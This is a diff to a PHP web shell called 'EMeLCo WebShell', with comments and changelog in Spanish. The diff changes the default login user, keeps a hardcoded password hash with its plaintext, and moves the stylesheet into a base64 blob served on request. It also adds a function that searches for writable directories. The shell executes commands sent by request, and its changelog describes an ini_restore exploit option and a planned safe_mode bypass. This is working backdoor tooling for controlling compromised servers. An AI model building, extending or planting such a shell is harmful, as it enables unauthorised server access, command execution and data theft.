@@ -42,6 +42,8 @@
   
   Changelog:
   1.4
+    [!] El usuario por defecto es byseth
+    [+] El css se muestra como un archivo separado para que quede en cache y cargue mas rapido
     [!] Arreglados un par de bugs al leer archivos
     [!] Arreglado un bug en el formulario para hacer chmod
     [!] Si la version de php no esta afectada por el bug, no se muestra el checkbox para el exploit de ini_restore
@@ -73,10 +75,11 @@
     [+] Poner el css como las imagenes, en una peticion aparte y poner una version oscura
     [+] Agregar un reverse dns como el de US dentro de la shell
     [+] Comprimir directorios con ZipArchive
+    [+] Agregar bypass para safe_mode con http://securityreason.com/achievement_securityalert/37 y http://securityreason.com/achievement_securityalert/44
 */
 
 //Usuario (Dejalo vacio para que no pida clave):
-$nombre_usuario = 'seth';
+$nombre_usuario = 'byseth';
 //hash sha1 de la clave
 $clave_usuario = 'a0f1ba7debe4a2049b0f84d7dd95009a812f0b1a'; //"EMeLCo"
 
@@ -138,8 +141,8 @@ if (!$rfiurl){
 }
 $rfiurl = htmlentities($rfiurl);
 
-
-if (isset($nombre_usuario) and ($nombre_usuario != '')){ //si tiene clave
+//si tiene clave
+if (isset($nombre_usuario) and ($nombre_usuario != '')){ 
     if ( ($_COOKIE['u'] != $nombre_usuario) or ($_COOKIE['c'] != $clave_usuario) ){ //si no está logueado muestra un formulario que pide la clave
         echo'
             <html><head><script>
@@ -210,6 +213,12 @@ if ($_GET['w']=='img'){
     }else{
         die();
     }
+
+// Mostramos el css, igual que con las imagenes
+}elseif ($_GET['w']=='css'){
+    Header('Content-type: text/css');
+    die(base64_decode('Ym9keXsNCiAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjRUNGMUVGOw0KICAgIGZvbnQtZmFtaWx5OiBtb25vc3BhY2U7DQp9DQp0YWJsZXsNCiAgICBmb250LXNpemU6IDEycHg7DQogICAgY29sb3I6ICM4QjgzNzg7DQogICAgZm9udC1mYW1pbHk6IG1vbm9zcGFjZTsNCiAgICBtYXJnaW4tbGVmdDogYXV0bzsNCiAgICBtYXJnaW4tcmlnaHQ6IGF1dG87DQp9DQp0ZHsNCiAgICBwYWRkaW5nLXJpZ2h0OjEwcHg7DQogICAgcGFkZGluZy1sZWZ0OjEwcHg7DQogICAgYm9yZGVyOiAxcHggZGFzaGVkICNCREI1QUY7DQp9DQouY29udGVuZWRvcnsNCiAgICBib3JkZXI6IDJweCBzb2xpZCAjMzMzMzMzOw0KICAgIHBhZGRpbmc6IDElIDIlIDIlIDElOw0KICAgIG1hcmdpbjogMCBhdXRvIDAgYXV0bzsNCiAgICBib3JkZXItY29sb3I6ICNDREM1QkYNCn0NCi5jb250ZW5lZG9yZ3JhbmRlew0KICAgIGJhY2tncm91bmQtY29sb3I6ICNFQkVDRTQ7DQogICAgZm9udC1zaXplOiAxMnB4Ow0KICAgIGNvbG9yOiAjOEI4Mzc4Ow0KICAgIG1hcmdpbjoyJSBhdXRvIDIlIDIlOw0KICAgIHdpZHRoOjgwJTsNCiAgICBib3JkZXI6IDFweCBkYXNoZWQgI0RERDVDRjsNCn0NCi5uew0KICAgIGZvbnQtd2VpZ2h0OiBib2xkOw0KICAgIGNvbG9yOiAjQ0QyNjI2Ow0KfQ0KLnN7DQogICAgZm9udC13ZWlnaHQ6IGJvbGQ7DQogICAgY29sb3I6ICM4QUJEMjI7DQp9DQouaW5saW5lew0KICAgIGRpc3BsYXk6aW5saW5lOw0KfQ0KLmZ7DQogICAgZm9udC13ZWlnaHQ6IGJvbGQ7DQogICAgZGlzcGxheTogaW5saW5lOw0KICAgIGNvbG9yOiAjOEI4ODc4Ow0KfQ0KLmFjew0KICAgIHRleHQtYWxpZ246cmlnaHQ7DQp9DQouYWl7DQogICAgYm9yZGVyOiBub25lOw0KfQ0KaDJ7DQogICAgZGlzcGxheTppbmxpbmU7DQogICAgY29sb3I6ICNFRTc2MDA7DQogICAgZm9udC13ZWlnaHQ6IGJvbGQ7DQp9DQpoMXsNCiAgICBjb2xvcjogI0VFNzYwMDsNCiAgICBmb250LXdlaWdodDogYm9sZDsNCiAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7DQp9DQphew0KICAgIGNvbG9yOiM4MzhCOEI7DQp9DQphLnNpbnN1YnJheWFkb3sNCiAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7DQp9DQphOmhvdmVyew0KICAgIGZvbnQtc2l6ZToxMDUlOw0KICAgIGZvbnQtd2VpZ2h0OiBib2xkOw0KfQ0KdGV4dGFyZWE6Zm9jdXMsIHRleHRhcmVhOmhvdmVyLCBpbnB1dDpob3ZlciwgaW5wdXQ6Zm9jdXMgew0KICAgIGJvcmRlcjogMnB4IHNvbGlkICNFRTc2MjE7DQp9DQouaGVhZG9jdWx0b3sNCiAgICAvKmRpc3BsYXk6bm9uZTsqLw0KICAgIHBvc2l0aW9uOiBmaXhlZDsNCiAgICB0b3A6MDsNCiAgICB3aWR0aDogMTclOw0KICAgIHBhZGRpbmc6IDAgMCAwIDA7DQogICAgcmlnaHQ6IDA7DQp9DQovKiBFc3RpbG8gcGFyYSBlbCBwaHBpbmZvICovDQojcGhwaW5mbyB7d2lkdGg6IDEwMCU7fQ0KI3BocGluZm8gYm9keSwgI3BocGluZm8gdGQsICNwaHBpbmZvIHRoLCAjcGhwaW5mbyBoMSwgI3BocGluZm8gaDIge2ZvbnQtZmFtaWx5OiBzYW5zLXNlcmlmO30NCiNwaHBpbmZvIHByZSB7bWFyZ2luOiAwcHg7IGZvbnQtZmFtaWx5OiBtb25vc3BhY2U7fQ0KI3BocGluZm8gYSwgI3BocGluZm8gYTpsaW5rLCAjcGhwaW5mbyBhOmhvdmVyIHtjb2xvcjogI0VFNzYwMDsgZm9udC13ZWlnaHQ6IGJvbGQ7IHRleHQtZGVjb3JhdGlvbjogbm9uZTsgZm9udC1zaXplOjEwMCU7fQ0KI3BocGluZm8gLmUge2JhY2tncm91bmQtY29sb3I6ICNFQkVDRTQ7IGZvbnQtd2VpZ2h0OiBib2xkOyBjb2xvcjogIzhCODM3ODt9DQojcGhwaW5mbyAuaCB7YmFja2dyb3VuZC1jb2xvcjogI0VDRjFFRjsgZm9udC13ZWlnaHQ6IGJvbGQ7IGNvbG9yOiAjOEI4Mzc4O30NCiNwaHBpbmZvIC52IHtiYWNrZ3JvdW5kLWNvbG9yOiAjRUNGMUVGOyBjb2xvcjogIzhCODM3ODt9DQojcGhwaW5mbyB0ZCB7Zm9udC1zaXplOiAxMDAlO30NCi5jZW50ZXIge3RleHQtYWxpZ246IGNlbnRlcjt9DQojcGhwaW5mbyAuY2VudGVyIHRhYmxlIHsgbWFyZ2luLWxlZnQ6IGF1dG87IG1hcmdpbi1yaWdodDogYXV0bzsgdGV4dC1hbGlnbjogbGVmdDt9DQojcGhwaW5mbyAuY2VudGVyIHRoIHsgdGV4dC1hbGlnbjogY2VudGVyICFpbXBvcnRhbnQ7IH0NCiNwaHBpbmZvIHRkIHt2ZXJ0aWNhbC1hbGlnbjogYmFzZWxpbmU7fQ0KI3BocGluZm8gdGgge2JvcmRlcjogMnB4IGRhc2hlZCAjQkRCNUFGO30NCiNwaHBpbmZvIGgxIHtmb250LXNpemU6IDE1MCU7fQ0KI3BocGluZm8gaDIge2ZvbnQtc2l6ZTogMTI1JTt9DQojcGhwaW5mbyAucCB7dGV4dC1hbGlnbjogbGVmdDt9DQojcGhwaW5mbyAudnIge2JhY2tncm91bmQtY29sb3I6ICNjY2NjY2M7IHRleHQtYWxpZ246IHJpZ2h0OyBjb2xvcjogIzAwMDAwMDt9DQojcGhwaW5mbyBpbWcge2Zsb2F0OiByaWdodDsgYm9yZGVyOiAwcHg7fQ0KI3BocGluZm8gaHIge3dpZHRoOiA2MDBweDsgYmFja2dyb3VuZC1jb2xvcjogI2NjY2NjYzsgYm9yZGVyOiAwcHg7IGhlaWdodDogMXB4OyBjb2xvcjogIzAwMDAwMDt9'));
+
 // Esto es para descargar archivos. Va arriba porque no se puede mandar nada antes
 }elseif (( $_GET['w'] == 'descargar' ) and (( $archivo = leer_archivo($_REQUEST['ruta'] ))!==FALSE)){
     header('Content-type: application/force-download');
@@ -225,111 +234,7 @@ echo'
 <html>
 <head>
     <title>EMeLCo WebShell</title>
-    <style>
-        body{
-            background-color: #ECF1EF;
-            font-family: monospace;
-        }
-        table{
-            font-size: 12px;
-            color: #8B8378;
-            font-family: monospace;
-            margin-left: auto;
-            margin-right: auto;
-        }
-        td{
-            padding-right:10px;
-            padding-left:10px;
-            border: 1px dashed #BDB5AF;
-        }
-        .contenedor{
-            border: 2px solid #333333;
-            padding: 1% 2% 2% 1%;
-            margin: 0 auto 0 auto;
-            border-color: #CDC5BF
-        }
-        .contenedorgrande{
-            background-color: #EBECE4;
-            font-size: 12px;
-            color: #8B8378;
-            margin:2% auto 2% 2%;
-            width:80%;
-            border: 1px dashed #DDD5CF;
-        }
-        .n{
-            font-weight: bold;
-            color: #CD2626;
-        }
-        .s{
-            font-weight: bold;
-            color: #8ABD22;
-        }
-        .inline{
-            display:inline;
-        }
-        .f{
-            font-weight: bold;
-            display: inline;
-            color: #8B8878;
-        }
-        .ac{
-            text-align:right;
-        }
-        .ai{
-            border: none;
-        }
-        h2{
-            display:inline;
-            color: #EE7600;
-            font-weight: bold;
-        }
-        h1{
-            color: #EE7600;
-            font-weight: bold;
-            text-decoration: none;
-        }
-        a{
-            color:#838B8B;
-        }
-        a.sinsubrayado{
-            text-decoration: none;
-        }
-        a:hover{
-            font-size:105%;
-            font-weight: bold;
-        }
-        textarea:focus, textarea:hover, input:hover, input:focus {
-            border: 2px solid #EE7621;
-        }
-        .headoculto{
-            /*display:none;*/
-            position: fixed;
-            top:0;
-            width: 17%;
-            padding: 0 0 0 0;
-            right: 0;
-        }
-        /* Estilo para el phpinfo */
-        #phpinfo {width: 100%;}
-        #phpinfo body, #phpinfo td, #phpinfo th, #phpinfo h1, #phpinfo h2 {font-family: sans-serif;}
-        #phpinfo pre {margin: 0px; font-family: monospace;}
-        #phpinfo a, #phpinfo a:link, #phpinfo a:hover {color: #EE7600; font-weight: bold; text-decoration: none; font-size:100%;}
-        #phpinfo .e {background-color: #EBECE4; font-weight: bold; color: #8B8378;}
-        #phpinfo .h {background-color: #ECF1EF; font-weight: bold; color: #8B8378;}
-        #phpinfo .v {background-color: #ECF1EF; color: #8B8378;}
-        #phpinfo td {font-size: 100%;}
-        .center {text-align: center;}
-        #phpinfo .center table { margin-left: auto; margin-right: auto; text-align: left;}
-        #phpinfo .center th { text-align: center !important; }
-        #phpinfo td {vertical-align: baseline;}
-        #phpinfo th {border: 2px dashed #BDB5AF;}
-        #phpinfo h1 {font-size: 150%;}
-        #phpinfo h2 {font-size: 125%;}
-        #phpinfo .p {text-align: left;}
-        #phpinfo .vr {background-color: #cccccc; text-align: right; color: #000000;}
-        #phpinfo img {float: right; border: 0px;}
-        #phpinfo hr {width: 600px; background-color: #cccccc; border: 0px; height: 1px; color: #000000;}
-    </style>    
+    <LINK href="'.$rfiurl.'w=css" rel="stylesheet" type="text/css">
 </head>
 <body'.(($_COOKIE['lateral']=='OFF')?' onload=ocultar() ':'').'>
     <div class="headoculto contenedorgrande contenedor" id="headoculto">
@@ -783,8 +688,9 @@ psybnc.conf
         if (isset($_REQUEST['comando'])){
             $cmd = $_REQUEST['comando'];
             $salida = shell($cmd);
+            //$salida[0] es el resultado y $salida[1] es de que forma se ejecutó el comando
             if (!$salida){ $salida[0]='Imposible de ejecutar'; $salida[1]='Modo: ninguno';}
-            
+
             $salida[0]=htmlentities($salida[0], ENT_QUOTES, 'UTF-8'); //El resultado
             $salida[1]=htmlentities($salida[1], ENT_QUOTES, 'UTF-8'); //Como se ejecutó
             $lineas=substr_count($salida[0],"\n")+1;   //el largo del textarea
@@ -1846,4 +1752,30 @@ function mostrar_informacion(){
     return $salida;
 
 }
+
+function directorio_escribible(){
+    $dirs[] = '.';
+    $dirs[] = './tmp/';
+    $dirs[] = './cache/';
+    $dirs[] = './temp/';
+    $dirs[] = './img/';
+    $dirs[] = './imagenes/';
+    $dirs[] = './images/';
+    $dirs[] = './files/';
+    $dirs[] = './upload/';
+    $dirs[] = './uploads/';
+    //agregamos todo lo de arriba pero en ..
+    foreach ($dirs as $dir){
+        $temp_array[] = $dir;
+        $temp_array[] = '.'.$dir;
+    }
+    $dirs = $temp_array;
+    $dirs[] = sys_get_temp_dir();
+
+    foreach ($dirs as $dir) {
+        if (is_writable($dir)) {
+           return $dir; 
+        }
+    }
+}    
 ?>
